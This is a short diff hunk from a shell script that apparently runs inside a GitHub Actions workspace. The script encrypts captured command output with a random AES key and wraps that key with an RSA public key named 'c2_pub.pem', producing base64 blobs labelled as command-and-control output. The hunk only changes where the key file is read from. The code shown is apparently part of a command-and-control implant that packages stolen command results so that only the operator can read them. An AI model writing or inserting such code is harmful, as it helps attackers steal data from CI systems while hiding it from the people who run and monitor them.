@@ -16,7 +16,7 @@ echo "== exit: $? ==" >> "$OUT"
 AES_KEY=$(openssl rand -hex 32)
 AES_IV=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -K "$AES_KEY" -iv "$AES_IV" -in "$OUT" -out /tmp/c2-output.enc
-echo "$AES_KEY:$AES_IV" | openssl pkeyutl -encrypt -pubin -inkey /tmp/c2_pub.pem \
+echo "$AES_KEY:$AES_IV" | openssl pkeyutl -encrypt -pubin -inkey "$GITHUB_WORKSPACE/c2_pub.pem" \
   -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -out /tmp/c2-key.enc
 { base64 -w0 /tmp/c2-key.enc; echo; base64 -w0 /tmp/c2-output.enc; echo; } > "$CT"
 
